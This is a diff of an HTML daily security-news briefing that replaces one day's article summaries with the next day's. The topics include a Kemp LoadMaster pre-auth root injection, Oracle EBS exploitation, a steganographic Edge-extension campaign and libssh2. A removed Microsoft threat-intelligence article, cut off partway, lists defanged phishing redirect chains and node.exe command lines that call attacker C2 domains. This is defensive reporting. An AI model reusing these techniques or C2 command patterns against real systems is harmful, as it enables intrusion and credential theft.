@@ -59,15 +59,15 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-06-29</h1>
+        <h1>Security Briefing // 2026-06-30</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">US seizes hundreds of FIFA World Cup illegal streaming domains</button></li><li><button onclick="show('art-1')">Microsoft Removes 119 Edge Extensions That Hid Malware in Images and Fonts</button></li><li><button onclick="show('art-2')">Public PoC Released for Critical libssh2 CVE-2026-55200 Client-Side SSH Flaw</button></li><li><button onclick="show('art-3')">Time Travel Debugging with Codex</button></li><li><button onclick="show('art-4')">CISA sets urgent deadline to fix Cisco flaw exploited in attacks</button></li><li><button onclick="show('art-5')">Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access</button></li><li><button onclick="show('art-6')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-7')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-8')">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</button></li><li><button onclick="show('art-9')">North Korea-Nexus Threat Actor Compromises Widely Used Axios NPM Package in Supply Chain Attack</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Blackfield ransomware asks Nidec Corporation for $2 million ransom</button></li><li><button onclick="show('art-1')">Progress Kemp LoadMaster Flaw Could Let Attackers Run Root Commands Pre-Auth</button></li><li><button onclick="show('art-2')">Oracle E-Business Suite Flaw CVE-2026-46817 Actively Exploited in the Wild</button></li><li><button onclick="show('art-3')">Accelerating EDR Evasion with LLM-Driven Analysis</button></li><li><button onclick="show('art-4')">Chromium extension uses AI‑related branding to redirect browser search</button></li><li><button onclick="show('art-5')">The Bear Necessities: A Look at the Drivers, Dynamics, and Applications of the Pro-Russia Influence Ecosystem</button></li><li><button onclick="show('art-6')">Hackers now exploit critical Oracle E-Business flaw in attacks</button></li><li><button onclick="show('art-7')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
-            <h2 class="article-title">US seizes hundreds of FIFA World Cup illegal streaming domains</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/us-seizes-hundreds-of-fifa-world-cup-illegal-streaming-domains/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Justice Department's Criminal Division has seized nearly 400 web domains used for illegally streaming matches at the FIFA World Cup. [...]
+            <h2 class="article-title">Blackfield ransomware asks Nidec Corporation for $2 million ransom</h2>
+            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/blackfield-ransomware-asks-nidec-corporation-for-2-million-ransom/" target="_blank">Original Link</a></p>
+            <div class="content-text">The Blackfield ransomware gang is asking for a $2 million ransom from Nidec Corporation, a large Japanese manufacturer of electronic components for automotive and computing applications. [...]
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
@@ -75,73 +75,56 @@
             <hr class="separator">
         </div>
         <div id="art-1" class="article-body">
-            <h2 class="article-title">Microsoft Removes 119 Edge Extensions That Hid Malware in Images and Fonts</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/microsoft-removes-119-edge-extensions.html" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft has shut down a long-running malicious extension operation on the Edge Add-ons store that hid its payloads inside ordinary image and font files, then woke up days after install to steal credentials and run ad fraud.
-The company calls it [StegoAd](https://microsoftedge.github.io/edgevr/posts/Inside-StegoAd-How-We-Disrupted-a-Massive-Malicious-Extension-Campaign/), a mash-up of steganography and adware, and ties 119 extensions to a single threat actor it says has been active since at least 2021.
-The extensions were the kind people install without a second thought: ad blockers, VPNs, translators, video downloaders. Each one did its job and earned reviews. The malicious code stayed dormant until the extension cleared a stack of evasion checks, which is how it sat in the store for years.
-Combined, the 119 extensions had an install base of up to 2.6 million users. Microsoft is clear that this is a ceiling, not a victim count.
-A multi-day delay, server-side validation, and a 10% execution gate on some variants meant the payload never fired for many installs. How many people were actually compromised is not known.
-Code hidden in pictures and fonts
-The trick that names the campaign is steganography: tucking executable code inside files that look completely normal. The earliest variants appended JavaScript after the IEND marker of a PNG icon, so the image rendered fine everywhere while carrying a payload that static scanners never flagged.
-As detection caught up, the actor moved to WebP images, then to WOFF2 font files, hiding code in glyph ranges that read as Asian text or font metadata. Microsoft calls steganography at this scale rare in the browser extension ecosystem.
-Some high-impact variants did not even ship the payload locally. They fetched a normal-looking image from a command-and-control server. The extension decoded it through layers of case swaps, digit swaps, Base64, and XOR, then checked it against a signature before running it.
-The C2 server only served the real file to requests that passed a fingerprint and a User-Agent check; anyone probing it directly, researchers included, got an empty decoy response.
-Extensions also watched for open DevTools and extended their dormancy if they spotted an analyst looking.
-Ad fraud on top, credential theft underneath
-The visible damage was ad fraud: injected ads, hijacked affiliate commissions on Amazon, eBay, and AliExpress, and redirected searches, all skimming money while degrading browsing.
-Microsoft's analysis of retrieved payloads found a lot more underneath. The payloads included a remote code execution backdoor that ran arbitrary JavaScript pushed from the server. They also stole Google credentials and second-factor codes at sign-in, harvested WordPress admin logins, and exfiltrated cookies in bulk for session hijacking.
-Microsoft says seven Google Analytics tracking IDs appear to have served as covert telemetry, giving the operator near real-time dashboards on the campaign through Google's own infrastructure.
-The plumbing matched the ambition. Microsoft counts more than ten C2 domains with automatic failover. The actor proxied traffic through Cloudflare Workers and abused GitHub Pages to host beacons.
-A polymorphic framework ran across roughly 66 extensions under 15-plus naming variants, and the operation migrated from Manifest V2 to V3 as the actor adapted to platform changes.
-What to do
-Microsoft says it has removed all 119 extensions and suspended the 90-plus developer accounts behind them. The full list of extension IDs is in the company's [technical report](https://microsoftedge.github.io/edgevr/assets/files/stego_ad/Microsoft_Edge_Security_StegoAd.pdf).
-Open edge://extensions and compare your installed add-ons against that list. If anything matches, or if Edge removed one automatically, treat the browser as exposed. Change passwords for Google, WordPress, banking, and other sensitive accounts.
-Review recent sign-in activity, and turn on strong two-factor authentication. Hardware security keys hold up against this kind of credential theft in a way that SMS codes do not. Microsoft published indicators of compromise for use across Chrome, Firefox, and other Chromium browsers.
-StegoAd looks less like a new campaign than a new face on a known one. Its credential payload exfiltrates to mitarchive.info, a domain Koi Security ties to [DarkSpectre](https://thehackernews.com/2025/12/darkspectre-browser-extension-campaigns.html), the Chinese operation it linked in December to the [ShadyPanda](https://thehackernews.com/2025/12/shadypanda-turns-popular-browser.html) and GhostPoster extension campaigns.
-The connection goes beyond the domain. StegoAd hides code inside an extension's own icon, the same method GhostPoster used months earlier. The two even share extension names, such as Ads Block Ultimate.
-Microsoft has not named the actor, but the overlap is clear. The operator is still active, Microsoft says.
+            <h2 class="article-title">Progress Kemp LoadMaster Flaw Could Let Attackers Run Root Commands Pre-Auth</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/progress-kemp-loadmaster-flaw-could-let.html" target="_blank">Original Link</a></p>
+            <div class="content-text">A critical vulnerability in Progress Kemp LoadMaster can let an unauthenticated attacker execute arbitrary commands as root on the appliance by sending a crafted request to its API.
+The flaw, tracked as CVE-2026-8037, carries a CVSS score of [9.8 according to ZDI](https://www.zerodayinitiative.com/advisories/ZDI-26-342/). A patch is available. If you run LoadMaster with the API enabled, update now.
+Progress [published its advisory on June 4](https://community.progress.com/s/article/LoadMaster-Critical-Security-Bulletin-June-2026-CVE-2026-8037-CVE-2026-33691) and says it has not received any reports of exploitation. On June 29, researchers at watchTowr Labs published a [detailed](https://labs.watchtowr.com/enterprise-tech-in-shell-out-progress-kemp-loadmaster-uninitialized-heap-to-pre-auth-rce-cve-2026-8037/) technical write-up that walks through the full exploit chain.
+What the Flaw Does
+LoadMaster is an application delivery controller and load balancer used by enterprises to manage traffic across servers. It sits at the network edge, which makes any pre-auth flaw in it especially dangerous.
+The vulnerability lives in a function called escape_quotes(), which is supposed to sanitize user input before it gets passed into a shell command. The function's job is to escape single quotes so that an attacker cannot break out of a quoted string and inject commands. The problem: it allocated a memory buffer without clearing it first and never wrote a null terminator at the end of the sanitized string.
+That missing terminator is the whole exploit. Without it, the system keeps reading past the end of the sanitized input into whatever data happens to sit next to it in memory. An attacker can control what sits there by stuffing extra JSON keys into the same API request, each carrying a command injection payload. The system reads the sanitized input, keeps going, hits the attacker's payload, and executes it.
+The attack targets the /accessv2 endpoint, which handles API credential validation. The attacker sends a JSON body with a specially crafted apiuser value and dozens of extra key-value pairs sprayed with the command they want to run. No valid credentials are needed. The command runs as root.
+Affected Versions and Fix
+The flaw affects LoadMaster GA v7.2.63.1 and older, and LTSF v7.2.54.17 and older, when the API is enabled. Progress has released fixed versions: GA v7.2.63.2 and LTSF v7.2.54.18.
+The patch itself is minimal. Two changes: the memory allocation function was swapped from one that leaves the buffer uninitialized to one that zero-fills it, and an explicit null terminator was added after the escaped output. Two lines of code that close a path to the root.
+The vulnerability was discovered by Syed Ibrahim Ahmed of TrendAI Research and reported to Progress through the Zero Day Initiative on April 15, 2026. ZDI coordinated the public advisory release on June 9. watchTowr Labs independently analyzed the patch diff and published their own full technical breakdown with a working proof of concept on June 29.
+Progress also patched a second, high-severity flaw in the same advisory: CVE-2026-33691, a WAF bypass where whitespace padding in filenames could circumvent file upload extension checks.
+A Pattern Worth Watching
+This is not LoadMaster's first critical flaw. In November 2024, CISA [added a previous LoadMaster command injection flaw](https://thehackernews.com/2024/11/cisa-alert-active-exploitation-of.html) (CVE-2024-1212, CVSS 10.0) to its Known Exploited Vulnerabilities catalog after confirmed exploitation in the wild.
+In April 2026, Progress patched five more high-severity LoadMaster flaws, four of them command injection issues. Progress is also the maker of MOVEit, whose 2023 vulnerabilities fueled a mass exploitation campaign by the Cl0p ransomware group.
+The [Canadian Centre for Cyber Security](https://www.cyber.gc.ca/en/alerts-advisories/progress-security-advisory-av26-552) has also issued an advisory urging administrators to apply the updates.
+No attacks on CVE-2026-8037 have been reported yet. A working proof of concept is now public. Patch, and then ask whether the API needs to be reachable at all.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-2" class="article-body">
-            <h2 class="article-title">Public PoC Released for Critical libssh2 CVE-2026-55200 Client-Side SSH Flaw</h2>
-            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/public-poc-released-for-critical.html" target="_blank">Original Link</a></p>
-            <div class="content-text">A public proof-of-concept is now out for [ CVE-2026-55200](https://nvd.nist.gov/vuln/detail/CVE-2026-55200), a critical flaw in
-[libssh2](https://github.com/libssh2/libssh2)that lets a malicious or compromised SSH server trigger memory corruption on a connecting client, with possible code execution. No credentials, no user interaction. The bug affects every release up to and including
-1.11.1
-and carries a CVSS 4.0 score of [9.2](https://www.vulncheck.com/advisories/libssh2-out-of-bounds-write-via-unchecked-packet-length-in-transport-c).
-libssh2 is a client-side SSH library, not a server. That distinction matters. It is embedded in curl, Git, PHP, backup agents, firmware updaters, and a long tail of appliances.
-Anything that links it and reaches out to an untrusted SSH endpoint is a potential target. Many of those copies are statically linked, so a distro package update will not touch them, and you may not know they are there.
-How the bug works
-The flaw lives in ssh2_transport_read() in transport.c, the function that parses incoming SSH packets during the handshake. It read the attacker-controlled packet_length field and rejected only values below 1. It never enforced an upper bound.
-The size calculation adds packet_length to a couple of small values using 32-bit arithmetic, so a length of 0xffffffff wraps around to a tiny number. libssh2 then allocates a buffer sized for the tiny number, while later code writes the full, oversized packet into it.
-The result is an out-of-bounds heap write, classed as [CWE-680](https://cwe.mitre.org/data/definitions/680.html), integer overflow to buffer overflow, a classic primitive for code execution. The [fix](https://github.com/libssh2/libssh2/commit/97acf3dfda80c91c3a8c9f2372546301d4a1a7a8) adds the missing check, rejecting any packet_length above LIBSSH2_PACKET_MAXPAYLOAD before the math runs.
-libssh2 has tripped over this before. In 2019, it shipped version 1.8.1 to fix a batch of nine flaws led by [CVE-2019-3855](https://thehackernews.com/2019/03/libssh2-vulnerabilities.html), a near-identical integer overflow in its transport read that also let a malicious server run code on a connecting client. Seven years later, the same class of bug is back in the same code.
-Security researcher Tristan Madani reported the issue. Maintainers merged the patch through [pull request #2052](https://github.com/libssh2/libssh2/pull/2052) on June 12. VulnCheck published the CVE on June 17.
-A public proof-of-concept has been [published in "exploitarium,"](https://github.com/bikini/exploitarium/tree/main/libssh2-cve-2026-55200-poc) a GitHub archive of exploit code whose author says entries were posted without prior reporting. The archive contains a locally verified SSH trigger scaffold and a controlled local RCE harness for the libssh2 bug, not a turnkey remote exploit. Reliable code execution against a live application would still depend on the target binary, allocator behavior, mitigations, and how the software embeds libssh2.
-The context is worth weighing. The author concedes the archive went out incomplete, with some entries weak and AI driving the fuzzing. As of now, CISA's exploitation rating for the CVE still reads none, and no in-the-wild use has been reported.
-What to do
-There is no fixed libssh2 release yet. The patch sits in the mainline source, and a tagged release is [still being prepared](https://seclists.org/oss-sec/2026/q2/1010), so Linux distributions and downstream projects are backporting it themselves; Debian, for one, already has a repaired build in testing.
-NHS England Digital has [issued an advisory](https://digital.nhs.uk/cyber-alerts/2026/cc-4799) urging affected organizations to update.
-- Inventory everything that links libssh2, including static or bundled copies that package managers will not flag. curl, Git, and PHP deployments are common carriers.
-- Apply a build that includes commit 97acf3d, whether a distro backport or a patched source build, and watch your vendor's advisory channel for release status.
-- Until patched, restrict outbound SSH connections to trusted servers and verify host keys. Give priority to clients that reach external SSH servers or resolve hosts through names that an attacker could redirect. Watch for oversized-packet anomalies and unexplained client crashes.
-Patch the rest of the batch too: CVE-2026-55199 (CVSS 8.2), a denial of service that traps a connecting client in a CPU loop via a bogus extension count, and CVE-2025-15661 (CVSS 8.3), an SFTP heap over-read.
-The core issue is a pre-auth memory-corruption bug in code that ships inside more clients and appliances than anyone has fully mapped.
-The open questions are how fast someone turns the local harness into a dependable remote exploit, and how many bundled copies stay vulnerable because no one remembers they shipped libssh2 inside.
+            <h2 class="article-title">Oracle E-Business Suite Flaw CVE-2026-46817 Actively Exploited in the Wild</h2>
+            <p class="source-link">Source: The Hacker News | <a href="https://thehackernews.com/2026/06/oracle-e-business-suite-flaw-cve-2026.html" target="_blank">Original Link</a></p>
+            <div class="content-text">A critical security flaw impacting Oracle E-Business Suite has come under active exploitation in the wild, according to Defused Cyber.
+The vulnerability, tracked as [CVE-2026-46817](https://nvd.nist.gov/vuln/detail/CVE-2026-46817) (CVSS score: 9.8), refers to an improper privilege management and authentication flaw in Oracle Payments that could be abused to take over susceptible instances.
+"Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle Payments," according to a description of the flaw in the NIST National Vulnerability Database (NVD). "Successful attacks of this vulnerability can result in the takeover of Oracle Payments."
+The shortcoming impacts versions from 12.2.3 through 12.2.15. Patches for the flaw were [shipped](https://www.oracle.com/security-alerts/cspumay2026verbose.html) by Oracle as part of its Critical Security Patch Update last month.
+CVE-2026-46817 has since come under active exploitation, with Defused Cyber [noting](https://x.com/DefusedCyber/status/2071555353733394618) on Monday that "over the weekend, we observed an actor exploiting the vulnerability on our Oracle E-Business honeypots," adding "this vulnerability has no known previous exploitation and no public PoC [proof-of-concept] code exists."
+That said, there are currently no details available on how the security flaw is being exploited, who is behind them, and if it's part of a broader opportunistic or targeted campaign aimed at unpatched systems.
+Late last year, another critical flaw in the same product ([CVE-2025-61882](https://thehackernews.com/2025/10/oracle-ebs-under-fire-as-cl0p-exploits.html), CVSS score: 9.8) was weaponized by threat actors linked to the Cl0p ransomware operation, with early attacks launched as far back as August 2025.
+Earlier this month, the company addressed a critical missing authentication zero-day vulnerability in PeopleSoft Suite ([CVE-2026-35273](https://thehackernews.com/2026/06/shinyhunters-exploits-oracle-peoplesoft.html), CVSS score: 9.8) that was actively exploited in ShinyHunters data theft and extortion attacks.
+Automaker Nissan has since [acknowledged](https://oag.ca.gov/ecrime/databreach/reports/sb24-625558) that it was among those impacted, stating it was the victim of a break-in that involved the exploitation of the PeopleSoft flaw, potentially exposing payroll records, bank details, Social Security numbers, and other personal and financial data belong to its employees in the U.S., Canada, Mexico, and Brazil.
+"What stood out was that CVE-2026-35273 isn't just another trivial, easy-to-exploit single-request vulnerability," Jake Knott, principal security researcher at watchTowr, said in a statement. "The attack chain is considerably more involved, combining multiple vulnerabilities to plant a malicious file that doesn’t execute immediately but waits until the server restarts."
+"Where we would normally see simple bugs, this is a chain of multiple vulnerabilities, suggestive of a threat actor with genuine knowledge of and familiarity with the underlying codebase, and the ability to develop targeted capabilities against it."
+Knott also pointed out that threat actors are exploiting vulnerabilities faster than ever before, urging organizations to assume compromise and activate incident response processes to determine whether access was obtained before patches were applied, what was accessed, and whether persistence was established.
 [Google News](https://news.google.com/publications/CAAqLQgKIidDQklTRndnTWFoTUtFWFJvWldoaFkydGxjbTVsZDNNdVkyOXRLQUFQAQ),</div>
             <br>
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
         <div id="art-3" class="article-body">
-            <h2 class="article-title">Time Travel Debugging with Codex</h2>
-            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/26/time-travel-debugging-with-codex/" target="_blank">Original Link</a></p>
-            <div class="content-text"><p>Spoiler warning: this post discusses the FLARE-ON 12 `FlareAuthenticator` challenge and includes the recovered flag. Introduction Before getting into the technical details, this work was made possible through SpecterOps&#8217; partnership with OpenAI&#8217;s through the Trusted Access for Cyber program. I also want to thank SpecterOps, my employer, for supporting this research and giving me time [&#8230;]</p>
-<p>The post <a href="https://specterops.io/blog/2026/06/26/time-travel-debugging-with-codex/">Time Travel Debugging with Codex</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
+            <h2 class="article-title">Accelerating EDR Evasion with LLM-Driven Analysis</h2>
+            <p class="source-link">Source: Research & Tradecraft Archives - SpecterOps | <a href="https://specterops.io/blog/2026/06/29/llm-powered-edr-analysis/" target="_blank">Original Link</a></p>
+            <div class="content-text"><p>Over the years I have enjoyed disassembling and debugging endpoint detection and response (EDR) and antivirus (AV) engines. For as long as I can remember I’d have evenings where I’d throw on some music, boot a virtual machine with kernel debugging enabled, and spend time searching for different evasion methods. While a fun way to [&#8230;]</p>
+<p>The post <a href="https://specterops.io/blog/2026/06/29/llm-powered-edr-analysis/">Accelerating EDR Evasion with LLM-Driven Analysis</a> appeared first on <a href="https://specterops.io">SpecterOps</a>.</p>
 
 [Full content could not be extracted. Visit source for details.]</div>
             <br>
@@ -149,451 +132,134 @@ The open questions are how fast someone turns the local harness into a dependabl
             <hr class="separator">
         </div>
         <div id="art-4" class="article-body">
-            <h2 class="article-title">CISA sets urgent deadline to fix Cisco flaw exploited in attacks</h2>
-            <p class="source-link">Source: BleepingComputer | <a href="https://www.bleepingcomputer.com/news/security/cisa-sets-urgent-deadline-to-fix-cisco-flaw-exploited-in-attacks/" target="_blank">Original Link</a></p>
-            <div class="content-text">The U.S. Cybersecurity and Infrastructure Security Agency (CISA) is giving federal agencies until Sunday to patch a vulnerability in Cisco Unified Communications Manager Server that is being actively exploited. [...]
-
-[Full content could not be extracted. Visit source for details.]</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/25/photo-zip-campaign-targeting-hospitality-industry-delivers-node-js-implant-persistent-access/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft Threat Intelligence has identified an active multi-stage intrusion campaign targeting organizations in the hospitality and hotel industry since April 2026. We’ve observed this activity through aggregated threat intelligence and security signals across multiple organizations in Europe and Asia. Microsoft has not attributed this campaign to a known threat actor.
-The campaign uses photo-themed ZIP archives that the target users download through the browser. These archives contain fake image shortcut files that, when launched, start an attack chain that relies on obfuscated PowerShell, a Node.js-based implant, dual registry persistence, and command-and-control (C2) communications over non-standard ports. As of this writing, the campaign’s post-compromise activities include C2 beaconing, forced shutdowns, and compilation of portable executable (PE) payloads. While the campaign’s ultimate objective remains unclear, we assess that the threat actor’s investment in ensuring obfuscation and persistence could indicate that they’re preparing the victim devices for more follow-on activities.
-In late May 2026, we observed the threat actor misusing legitimate services—including the cloud-based scheduling platform Calendly’s email notification infrastructure and Google’s URL redirect functionality—to deliver phishing emails with multilingual lures and subject lines (for example, guest complaints and room inquiries) designed to convince hospitality staff to open the embedded malicious link and download the ZIP archive. These phishing emails attempt to bypass conventional authentication checks through a technique we describe as authentication laundering: by routing phishing messages through a trusted service’s sending infrastructure, the threat actor can make malicious messages appear similar to legitimate notifications to email authentication defenses.
-We’ve observed the campaign evolving in two distinct waves. The first wave (hereinafter referred to as Wave 1) used shortcut files named IMG-<random numbers>.png.lnk, while the second one (Wave 2) introduced a naming shift to PHOTO-<random numbers>.png.lnk. Wave 2 also introduced a new attack chain stage in which the PowerShell downloader triggered dynamic .NET DLL compilation through csc.exe, and the actor expanded its domain infrastructure to include .cfd domains hosted behind Cloudflare.
-This blog summarizes the campaign’s Wave 1 and Wave 2 attack chains and provides Microsoft Defender detections and recommendations. It’s intended to share threat intelligence to help organizations better understand, identify, and defend against similar attack techniques. The activity described reflects observed patterns and behaviors and is provided to support defensive security efforts.
-Attack chain overview
-The campaign follows a multi-stage attack chain with limited variation in overall behavior, even as the actor changed its PowerShell obfuscation and delivery refinements between waves.
-Initial access and user execution
-The campaign begins with delivery of a browser-downloaded archive with a file name that uses the pattern photo-<random numbers>.zip. In one observed activity, links to these archives were delivered through phishing emails. We assess that this file naming convention was designed to appear ordinary yet relevant to hospitality workflows, which commonly exchange guest photos, reservation-related images, or document snapshots.
-In Wave 1, the archive contained a fake image shortcut named IMG-<random numbers>.png.lnk, which masqueraded as a PNG file while remaining executable content. In Wave 2, the threat actor introduced a naming shift to PHOTO-<random numbers>.png.lnk (uppercase PHOTO prefix). Successful execution depended on a target user opening what appeared to be an image.
-The following table lists representative delivery artifacts observed across impacted environments in both campaign waves. The file sizes of the LNK files consistently fell within 1,989 to 2,079 bytes, suggesting the same builder tool.
-| LNK file | Source archive | Wave |
-| IMG-805916584.png.lnk | C:\Users\[REDACTED]\Downloads\photo-961032103.zip | 1 |
-| IMG-421741673.png.lnk | C:\Users\[REDACTED]\Downloads\photo-818773648.zip | 1 |
-| IMG-223099041.png.lnk | C:\Users\[REDACTED]\Downloads\photo-716449357.zip | 1 |
-| IMG-386443483.png.lnk | Browser download | 1 |
-| PHOTO-215746435.png.lnk | Browser download | 2 |
-Observed LNK and ZIP naming patterns across both campaigns.
-Observed victim device naming patterns, including reception- and front office-associated systems and hotel-named devices, confirm the threat actor’s focus on staff likely to interact with image or document attachments as part of day-to-day operations. Some of the user account names observed across impacted environments include the following strings, which refer to words in different languages such as English, French, Polish, Czech, and Spanish:
-- reception
-- frontdesk
-- reservations
-- accueil
-- recepcja
-- recepce
-- frontoffice
-Phishing infrastructure: Authentication laundering through legitimate services
-Beginning late May 2026, we observed that this campaign’s initial access mechanism also abuses legitimate web services to bypass email authentication controls and obscure the true destination of phishing links. This observation aligns with the [previously published](https://socprime.com/active-threats/technical-analysis-of-suspicious-emails-targeting-the-hotel-industry/) [findings](https://blog.itochuci.co.jp/entry/2026/06/11/110000?utm_source=chatgpt.com) by other security researchers.
-The threat actor uses Calendly’s email notification system and Google’s URL redirect functionality to construct a multi-hop delivery chain in which the direct Calendly path passes Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting, and Conformance (DMARC) checks.
-Lure themes and language targeting
-The sender display name across all observed emails is “Booking Manager (via Calendly),” a social engineering choice that appears designed to exploit hospitality staff’s familiarity with booking and scheduling workflows.
-Across the relayed messages, Microsoft observed the following small set of recurring social-engineering themes delivered in Japanese, Danish, and Dutch:
-- Guest complaints
-- Bedbug (Cimex) infestation reports
-- Verification call notices
-- Room condition inquiries
-- Stay review requests
-These lures are deliberately generic and non-personalized: every subject references an anonymous “guest,” “facility,” or “your accommodation,” and none contains a recipient name, guest name, or organization name. This is consistent with high-volume, list-driven distribution rather than tailored spear-phishing. The threat actor relies on urgency and reputational pressure (complaints, “final warning,” health-authority inspection, possible suspension) to drive target hospitality staff to click.
-| Language | Canonical lure (theme) |
-| Japanese | Serious guest complaint |
-| Japanese | Bedbug complaint, verification call |
-| Japanese | Guest stay review request |
-| Japanese | Room condition, facility inquiry |
-| Japanese | Final warning: infestation, forced inspection |
-| Danish | Bedbug complaint, inspection call |
-| Danish | Formal complaint, notice of suspension |
-| Danish | Health-risk safety alert |
-| Dutch | Complaint: possible danger, hospitalization after stay |
-Phishing lure themes by language, listed by observed prevalence.
-The threat actor reuses the same themes across all three languages, with Japanese as the most prevalent. Notably, unfilled template placeholders—such as a literal ID token in the Danish variant—appeared in some subjects, indicating automated, templated generation.
-Use of Calendly notification infrastructure as a phishing relay
-The threat actor uses a threat actor-controlled Calendly account associated with the subdomain em1618.calendly.com to relay phishing emails to hospitality targets. Authentication results differ by delivery path.
-| Authentication Check | Result | Why |
-| SPF | Pass | Email sent from authorized service |
-| DKIM | Pass | Signed by Calendly’s SendGrid sending infrastructure |
-| DMARC | Pass | Alignment on calendly.com domain |
-| Composite authentication (CompAuth) | Pass | All checks align |
-Authentication results for emails sent through the direct Calendly path. The checks pass because the messages are sent through authorized Calendly-associated sending infrastructure; this does not validate the intent or safety of the message content.
-This technique, which we describe as authentication laundering in this context, exploits the trust model of email authentication. SPF, DKIM, and DMARC verify that an email was sent from authorized infrastructure for a given domain. When the sending domain is a legitimate service and the threat actor controls the message content, these checks confirm the sender is authorized while saying nothing about the intent of the message.
-Multi-hop redirect chain
-Each phishing email contains a Calendly redirect URL that initiates a multi-hop chain intended to obscure the final destination from users and automated URL analysis. The embedded Calendly link routes victims through a four-hop chain before reaching the payload:
-- Step 1: calendly[.]com/url?q=hxxps://share[.]google/TOKEN → HTTP 302
-- Step 2: share[.]google/TOKEN → HTTP 302
-- Step 3: www.google[.]com/share_google?q=TOKEN → HTTP 301
-- Step 4: photo-*[.]cfd → Phishing landing page (Cloudflare challenge gate)
-Calendly’s Link Safety Service interstitial (url?q=) was used as the first hop and Google’s share[.]google redirect as the second. The final .cfd landing pages were freshly registered (for example, photo-26654[.]cfd was 17 days old at the time of analysis), Cloudflare-fronted, and gated behind a Cloudflare Turnstile (“verify you are human”) challenge that doubles as an anti-analysis and geo-gating mechanism before serving the photo-themed ZIP.
-Microsoft assesses that this redirect architecture serves multiple evasion purposes:
-- Fragmentation of URL reputation: No single URL in the chain is inherently malicious at the time of delivery
-- Abuse of Google’s open redirect: The share.google → NULLwww.google.com/share_google redirect leverages Google infrastructure, adding trusted reputation to the chain
-The threat actor maintains a second delivery variant that bypasses the share.google intermediate step, linking directly from a Calendly redirect URL to the phishing domain (calendly[.]com/url?q=photo-*[.]cfd). Microsoft observed that both variants are active simultaneously, with the same Calendly user UUIDs appearing across both paths. This supports the assessment that a single operator is managing the parallel delivery mechanisms.
-PowerShell-based first stage
-Once the malicious shortcut is opened, the next-stage payload invokes PowerShell and launches an obfuscated BigInt decoder. Across the campaign, the PowerShell stage consistently decodes data and then downloads an additional .ps1 file. Microsoft observed a repeating pattern of BigInt decoder → Invoke-WebRequest → .ps1. The full obfuscation evolution across seven phases is detailed in the Obfuscation evolution section of this blog.
-The decoded URL points to the campaign’s download domains. In the validated chain, the .ps1 file is retrieved from the photo-*.cfd landing domain
-.NET DLL compilation (Wave 2)
-In Wave 2, we observed a new intermediate stage between the PowerShell download and Node.js deployment. The downloaded .ps1 script triggers dynamic .NET compilation through csc.exe (the C# compiler), which in turn invokes cvtres.exe (the resource-to-object converter). This sequence produces small DLL files with random names.
-Representative observed artifacts:
-| Artifact | Details |
-| PowerShell script | qFWe908J.ps1 ( Size 419 KB) |
-| Compiled DLL | bjygtujc.dll Size 3,072 bytes) |
-csc.exe → cvtres.exe → <random>.dll (3,072 bytes)
-Figure 2. Wave 2 .NET DLL compilation chain. The compiled DLL was created but wasn’t observed being loaded through rundll32 or regsvr32 in available telemetry. This stage might be preparatory or conditional.
-Microsoft assesses that this stage wasn’t present in Wave 1 and represents an expansion in the attack chain.
-Script staging and Node.js implant deployment
-After decoding and retrieval, the downloaded PowerShell script runs from the %TEMP% folder. This staging step appears to be transitional rather than final, enabling subsequent download or launch of the campaign’s Node.js component.
-We observed the next step as execution of node.exe from a user-space path. The Node runtime version observed across both waves is node-v24.13.0-win-x64 (SHA-256: d14ba95cdce1ef7dc9ad3ac74949ca5db38b27378ee30f30a23cf26f9e875a11, 89.9 MB – downloaded from the legitimate nodejs[.]org site).
-Figure 3 shows representative observed command lines:
-"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\E2HPVoYGA77RECeb.js safedocphoto[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\jVXvdhxNfcqHuSf.js recallnine[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\c4yCFRzE.js kentjerk[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\FfXznFDs8.js photodoc-secure[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\f76qtHrP.js kelopins[.]info |
